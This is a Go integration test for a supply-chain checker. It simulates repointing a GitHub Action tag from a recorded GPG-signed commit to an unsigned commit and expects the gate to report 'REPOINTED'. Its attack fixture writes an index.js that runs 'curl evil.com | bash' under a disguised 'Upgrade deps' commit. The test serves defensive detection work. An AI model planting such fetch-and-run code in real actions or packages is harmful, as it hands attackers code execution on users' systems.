// Copyright (C) 2026 CoreWeave, Inc.
// SPDX-License-Identifier: GPL-3.0-only

//go:build integration

package harness

import (
	"encoding/json"
	"os"
	"testing"
	"time"
)

// GPGSignatureDrop tests that repointing a tag from a GPG-signed commit
// (recorded in the lockfile) to an unsigned commit triggers detection.
// Uses pinpoint gate rather than scan, since gate reads the lockfile directly.
//
// Note: We can't actually GPG-sign commits via the GitHub API without a GPG key,
// so we simulate by writing gpg_signed: true in the lockfile manually.
type GPGSignatureDrop struct{}

func (s *GPGSignatureDrop) Name() string { return "gpg-signature-drop" }

func (s *GPGSignatureDrop) Setup(t *testing.T, h *TestHelper, repo, initSHA, initTree string) *ScenarioState {
	t.Helper()
	r := repoName(repo)

	// Create a legitimate action with a tag
	blob := h.CreateBlob(t, r, "name: my-action\ndescription: test\nruns:\n  using: node20\n  main: index.js\n")
	jsBlob := h.CreateBlob(t, r, "console.log('ok');\n")
	tree := h.CreateTree(t, r, initTree, map[string]string{
		"action.yml": blob,
		"index.js":   jsBlob,
	})
	goodCommit := h.CreateCommit(t, r, "Initial release", tree, []string{initSHA})
	h.UpdateBranch(t, r, "main", goodCommit)
	h.CreateLightweightTag(t, r, "v1.0.0", goodCommit)

	time.Sleep(2 * time.Second)

	// Write a manifest (lockfile) that records this tag as GPG-signed
	manifestDir := t.TempDir()
	manifestPath := manifestDir + "/actions-lock.json"

	type manifestEntry struct {
		SHA        string `json:"sha"`
		RecordedAt string `json:"recorded_at"`
		GPGSigned  *bool  `json:"gpg_signed,omitempty"`
		GPGSigner  string `json:"gpg_signer,omitempty"`
	}
	trueVal := true
	manifest := struct {
		Version     int                                    `json:"version"`
		GeneratedAt string                                 `json:"generated_at"`
		Actions     map[string]map[string]manifestEntry    `json:"actions"`
	}{
		Version:     1,
		GeneratedAt: time.Now().UTC().Format(time.RFC3339),
		Actions: map[string]map[string]manifestEntry{
			repo: {
				"v1.0.0": {
					SHA:        goodCommit,
					RecordedAt: time.Now().UTC().Format(time.RFC3339),
					GPGSigned:  &trueVal,
					GPGSigner:  "maintainer@example.com",
				},
			},
		},
	}
	data, _ := json.MarshalIndent(manifest, "", "  ")
	os.WriteFile(manifestPath, data, 0644)

	// Commit workflow + manifest to the repo for gate
	gateSHA := h.CommitGateFiles(t, r, repo, map[string]string{"v1.0.0": goodCommit})

	return &ScenarioState{
		TagSHAs:      map[string]string{"v1.0.0": goodCommit},
		ManifestPath: manifestPath,
		ConfigPath:   writeConfig(t, repo, []string{"v1.0.0"}),
		StatePath:    t.TempDir() + "/state.json",
		Extra: map[string]string{
			"gateSHA": gateSHA,
		},
	}
}

func (s *GPGSignatureDrop) Attack(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
	t.Helper()
	r := repoName(repo)

	// Create unsigned evil commit and repoint the tag
	evilBlob := h.CreateBlob(t, r, "name: my-action\ndescription: evil\nruns:\n  using: node20\n  main: index.js\n")
	evilJsBlob := h.CreateBlob(t, r, "const cp = require('child_process'); cp.execSync('curl evil.com | bash');\n")
	initTree := h.GetCommitTree(t, r, state.TagSHAs["v1.0.0"])
	evilTree := h.CreateTree(t, r, initTree, map[string]string{
		"action.yml": evilBlob,
		"index.js":   evilJsBlob,
	})
	evilCommit := h.CreateCommit(t, r, "Upgrade deps", evilTree, []string{state.TagSHAs["v1.0.0"]})
	h.RepointTag(t, r, "v1.0.0", evilCommit)
	state.EvilSHA = evilCommit
}

func (s *GPGSignatureDrop) Verify(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
	t.Helper()

	// Use gate to verify — it reads the manifest/lockfile
	gateSHA := state.Extra["gateSHA"]
	workflowRef := repo + "/.github/workflows/ci.yml@refs/heads/main"
	output, code := RunPinpointGate(t, state.ManifestPath, repo, gateSHA, workflowRef)

	// Gate should detect the repoint (tag SHA differs from manifest)
	if code != 2 {
		t.Fatalf("Expected gate exit 2, got %d. Output:\n%s", code, output)
	}
	assertContains(t, output, "REPOINTED")

	// TODO: Once spec 017 is implemented, also assert:
	// assertContains(t, output, "SIGNATURE_DROPPED")
}
